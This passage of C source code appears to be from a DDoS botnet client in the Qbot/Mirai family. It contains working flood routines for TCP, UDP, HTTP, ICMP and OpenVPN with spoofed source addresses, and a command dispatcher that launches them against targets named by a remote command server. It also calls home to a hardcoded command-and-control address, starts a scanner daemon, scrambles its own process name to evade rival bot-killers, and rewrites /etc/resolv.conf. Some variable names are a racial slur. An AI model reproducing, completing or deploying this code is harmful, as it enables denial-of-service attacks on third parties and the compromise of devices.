            memcpy((void *)tcph + sizeof(struct tcphdr), "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 512); //XXX#0304 was here!
            tcph->syn = 0;
            tcph->ack = 1;
            n++;
        }
        else if (n == 1) {
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            tcph->syn = 1;
            tcph->ack = 0;
            n = n - 1;
        }
        tcph->res2 = (rand() % 3);
        tcph->psh = rand() % 3 - 1;
        tcph->urg = rand() % 3 - 1;
        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;//wow big haxxor ur copying shit from other sources
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        if(i == pollRegister)
        {
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}



void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, useragents[(rand() % 59)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}

void SendHTTPCloudflare(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, host, useragents[(rand() % 36)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}

void UDPBYPASS(unsigned char *ip, int port, int secs, int packetsize)
{
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {   //change it if u want
        char *hexstring[] = {"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B"};
        if (a >= 50)
        {
            send(std_hex, hexstring, packetsize, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void sendJUNK(unsigned char *ip, int port, int end_time)
{

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(ip, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t
    {
        int fd;
        uint8_t state;
    } fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char *watwat = malloc(1024);
    memset(watwat, 0, 1024);

    int end = time(NULL) + end_time;
    while(end > time(NULL))
    {
        for(i = 0; i < max; i++)
        {
            switch(fds[i].state)
            {
            case 0:
            {
                fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                else fds[i].state = 1;
            }
            break;

            case 1:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          //bWFkZSBieSB4eHg
            {
                FD_ZERO(&myset);
                FD_SET(fds[i].fd, &myset);
                tv.tv_sec = 0;
                tv.tv_usec = 10000;
                res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                if(res == 1)
                {
                    lon = sizeof(int);
                    getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                    if(valopt)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    } else {
                        fds[i].state = 2;
                    }
                } else if(res == -1)
                {
                    close(fds[i].fd);
                    fds[i].state = 0;
                }
            }
            break;

            case 2:
            {
                makeRandomStr(watwat, 1024);
                if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                {
                    close(fds[i].fd);
                    fds[i].state = 0;
                }
            }
            break;
            }
        }
    }
}

struct fds_t {
    int fd;
    int state;
	int once;
};

unsigned short cal_chksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1)
    {
        sum +=  *w++;
        nleft -= 2;
    }

    if (nleft == 1)
    {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

static int socket_connect_icmp(unsigned char *host, int port) {
	int sockfd;
	struct protoent *protocol;
	if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname");
        return 0;
    }

    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0)
    {
        perror("socket error");
        return 0;
    }

	struct sockaddr_in addr;
	struct hostent *hp;
	if((hp = gethostbyname((char *)host)) == NULL) {
		return 0;
	}

	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) return 0;
	return sockfd;
}

int pack(int pack_no, char *sendpacket)
{
    int i, packsize;
    struct icmp *icmp;
    struct timeval *tval;
    icmp = (struct icmp*)sendpacket;
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    icmp->icmp_seq = pack_no;
    icmp->icmp_id = getpid();
    packsize = 8+1024;
    tval = (struct timeval*)icmp->icmp_data;
    gettimeofday(tval, NULL); 
    icmp->icmp_cksum = cal_chksum((unsigned short*)icmp, packsize); 
    char *data = (sendpacket+sizeof(icmp));
	makeRandomStr(data, 1024);
	return packsize;
}

void attacks_vector_wabba_jack(unsigned char *host, int port, int end_time) {
    int i = 0, fd = 0;

    struct fds_t fds[15];
	
	for(fd = 0; fd < 15; fd++) 
	{	
		fds[fd].once = 0;
	}

	char datapacket[4096];
	memset(datapacket, 0, 4096);
	int end = time(NULL) + end_time;
    while(end > time(NULL))
    {
		int packet;
		for(fd = 0; fd < 15; fd++) {
			switch(fds[fd].state) {
				case 0:
					if(fds[fd].once == 0) {
						fds[fd].fd = socket_connect_icmp(host, port);
						if(fds[fd].fd == 0) {
							fds[fd].once = 1;
						}
					}
					fds[fd].state = 1;
					break;
				case 1:
					pack(69, datapacket);
					for(packet = 0; packet < 2500; packet++) {
						sendto(fds[fd].fd, datapacket, (int)4096, MSG_NOSIGNAL, NULL, sizeof(struct sockaddr_in));
					}
					fds[fd].state = 2;
					break;
				case 2:
					fds[fd].state = 0;
					if(fds[fd].fd != 0) {
						close(fds[fd].fd);
						fds[fd].fd = -1;
					}
					break;
				default:
					fds[fd].state = 0;
			}
		}
	}
}

static int socket_connect_raw_udp(unsigned char *host, int port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int sock;

	if((hp = gethostbyname((char *)host)) == NULL) {
		return 0;
	}

	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_UDP);

    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        exit(0);
    }

	if (s == -1) return 0;

	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == -1) return 0;
	return s;
}

/* 
96 bit (12 bytes) pseudo header needed for tcp header csum calculation 
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

static char *build_udp_header(unsigned char *host, int port, int *tot_len, int data_len) {
	//Datagram to represent the packet
	char *datagram, *data , *pseudogram;
	datagram = malloc(8096);
	//zero out the packet buffer
	memset (datagram, 0, 8096);
	
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	/*//Data part
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	rand_alpha_str(data, 1024);*/
	
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = inet_addr(host);
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + data_len;
	iph->id = htonl (54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = LOCAL_ADDRESS;	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	
	//UDP header
	udph->source = htons (6666);
	udph->dest = htons (8622);
	udph->len = htons(8 + data_len);	//tcp header size
	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header
	
	//Now the UDP checksum using the pseudo header
	psh.source_address = LOCAL_ADDRESS;
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.tcp_length = htons(sizeof(struct udphdr) + data_len);
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + data_len;
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + data_len);
	
	udph->check = csum( (unsigned short*) pseudogram , psize);

	*tot_len = iph->tot_len;

	return datagram;
}

void attacks_vector_openvpn_swak(unsigned char *host, int port, int end_time) {
	//Datagrams to represent the packet

	int datagram_udp_len;
	int packet = 0;
    int fd = 0;

	char *datagram_udp = build_udp_header(host, port, &datagram_udp_len, 45);// yes this is ofc a memory leak but its closed in fork...
	datagram_udp_len += 45;

    struct fds_t fds[15];
	
	for(fd = 0; fd < 15; fd++) 
	{	
		fds[fd].once = 0;
	}

	int end = time(NULL) + end_time;
    while(end > time(NULL)) {
		memset(datagram_udp + sizeof(struct iphdr) + sizeof(struct udphdr), 0, 45);
		strcpy(datagram_udp + sizeof(struct iphdr) + sizeof(struct udphdr), "\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x38\x00\x00\x7F");
		for(fd = 0; fd < 15; fd++) {
			switch(fds[fd].state) {
				case 0:
					if(fds[fd].once == 0) {
						fds[fd].fd = socket_connect_raw_udp(host, port);
						if(fds[fd].fd == 0) {
							fds[fd].once = 1;
						}
					}
					fds[fd].state = 1;
					break;
				case 1:
					for(packet = 0; packet < 1500; packet++) {
						sendto(fds[fd].fd, datagram_udp, (int)datagram_udp_len, MSG_NOSIGNAL, (struct sockaddr *)NULL, sizeof(struct sockaddr_in));
					}
					fds[fd].state = 2;
					break;
				case 2:
					fds[fd].state = 0;
					if(fds[fd].fd != 0) {
						close(fds[fd].fd);
						fds[fd].fd = -1;
					}
					break;
				default:
					fds[fd].state = 0;
			}
		}
	}
	free(datagram_udp);
}


void processCmd(int argc, unsigned char *argv[]) {
   if (!strcmp(argv[0], "TLS")) {
        if (argc < 3 || atoi(argv[3]) < 0) {
            return;
        }
        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if(!listFork())
                    sendTLS(hi, port, time);
					_exit(0);
			}
			hi = strtok(NULL, ",");
         
        } else {
            if (!listFork()) {

            sendTLS(ip, port, time);
			_exit(0);
        }
    }
	}




	if(!strcmp(argv[0], "BLACKNURSE")) { //BLACKNURSE
		if (argc < 2) {
			return;
		}
		if(!listFork()) {
			bnrse(argv[1], atoi(argv[2]));
		}
	}
    

if(!strcmp(argv[0], "ICMP"))
    {
        return;
    }

	if(!strcmp(argv[0], "SCANNER"))
	{
		if(!strcmp(argv[0], "ON"))
		{
			if(check_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART) == 1) 
			{
				stop_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
			}
			create_fork_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
		}
		else if(!strcmp(argv[0], "OFF"))
		{
			if(check_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART) == 1) 
			{
				stop_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
			}
		}
	}

    if(!strcmp(argv[0], "CHOOPA"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "UDPBYPASS"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int packetsize = atoi(argv[4]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    UDPBYPASS(hi, port, time, packetsize);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            UDPBYPASS(ip, port, time, packetsize);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "ICMPFLOOD"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    attacks_vector_wabba_jack(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            attacks_vector_wabba_jack(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "OPENVPN"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    attacks_vector_openvpn_swak(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            attacks_vector_openvpn_swak(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "NFOV6"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }
	
    if(!strcmp(argv[0], "OVHRAW"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }
	
    if(!strcmp(argv[0], "JUNK"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            //sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
            return;
        }

        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    sendJUNK(hi, port, time);
                    close(mainCommSock);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }

            sendJUNK(ip, port, time);
            _exit(0);
        }
    }
    if(!strcmp(argv[0], "HYDRASYN"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }
    else if(!strcmp(argv[0], "OVH"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }
    else if(!strcmp(argv[0], "UDPRAW") || !strcmp(argv[0], "SHIT"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    UDPRAW(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork())
            {
                return;
            }
            UDPRAW(ip, port, time);
            _exit(0);
        }
    }
    else if(!strcmp(argv[0], "RANDHEX"))//unpatchable!!
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    Randhex(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork())
            {
                return;
            }
            Randhex(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "GAME-KILLER")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack1(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack1(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }///Leaked by Korpze
        return;
    }
    if(!strcmp(argv[0], "XMAS"))
    {
        if(argc < 6)
        {

            return;
        }

        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);

        int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
        int psize = argc > 5 ? atoi(argv[5]) : 0;

        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    rtcp(hi, port, time, spoofed, psize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }

            rtcp(ip, port, time, spoofed, psize, pollinterval);
            _exit(0);
        }
    }
    else if(!strcmp(argv[0], "KAFFER-SLAP"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }
    if(!strcmp(argv[0], "STD"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    SendSTD(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork())
            {
                return;
            }
            SendSTD(ip, port, time);
            _exit(0);
        }
    }
	
    if(!strcmp(argv[0], "STOMP"))
    {
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    SendSTD(hi, port, time);
                    audp(hi, port, time, spoofed, packetsize, pollinterval);
                    SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);
                    SendDOMINATE(hi, port, time, pollinterval);
                    close(mainCommSock);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            SendSTD(ip, port, time);
            audp(ip, port, time, spoofed, packetsize, pollinterval);
            SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);
            SendDOMINATE(ip, port, time, pollinterval);
            close(mainCommSock);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "STOP"))
    {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++)
        {
            if (pids[i] != 0 && pids[i] != getpid())
            {
                kill(pids[i], 9);
                killed++;
            }
        }
        if(killed > 0)
        {
            sockprintf(mainCommSock, "Killed %d.", killed);
            //follow Korpze1 on instagram
        } else {
            sockprintf(mainCommSock, "None Killed.");
        }
    }
}

int initConnection() {
    unsigned char server[512];
    memset(server, 0, 512);
    if(mainCommSock) {
        close(mainCommSock);
        mainCommSock = 0;
    }

    sprintf(server, "%d.%d.%d.%d", IPA, IPB, IPC, IPD);
    printf("%s", server);
    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
    if(!connectTimeout(mainCommSock, server, BP, 30)) return 1;
    return 0;
}

void makeFukdString(char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 223) + 33; // No spaces.
}

void touchMyself(unsigned char **argv) {
    if (!fork()) {
        while (1) {
            makeFukdString(argv[0], 1024 + (rand() % 128)); // Crashes almost all /proc/pid/cmdline based botkillers. Including Mirai. big swag
            sleep(3); // rape process name every 3 seconds
        }
    }
    return;
}

void UpdateNameSrvs() {
    uint16_t fhandler = open("/etc/resolv.conf", O_WRONLY | O_TRUNC);
    if (access("/etc/resolv.conf", F_OK) != -1) {
        const char* resd = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n";
        size_t resl = strlen(resd);
        write(fhandler, resd, resl);
    } else {
        return;
    }
    close(fhandler);
}
int getEndianness(void)
{
    union
    {
        uint32_t vlu;
        uint8_t data[sizeof(uint32_t)];
    } nmb;
    nmb.data[0] = 0x00;
    nmb.data[1] = 0x01;
    nmb.data[2] = 0x02;
    nmb.data[3] = 0x03;
    switch (nmb.vlu)
    {
    case UINT32_C(0x00010203):// big endian
        return 0;
    case UINT32_C(0x03020100):// little endian
        return 1;
    case UINT32_C(0x02030001):// big endian w
        return 2;
    case UINT32_C(0x01000302):// little endian w
        return 3;
    default:// unknown
        return 4;
    }
}

void main_handle() {
	create_fork_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
    while(1) {
        if(initConnection()) {
            sleep(5);    //why ur replacing this shit? ~l33t dont care... its all the same
            continue;
        }
        sockprintf(mainCommSock, "VER:%d:%s:%d:%d", bot_version, bot_name, getEndianness(), getBuild());
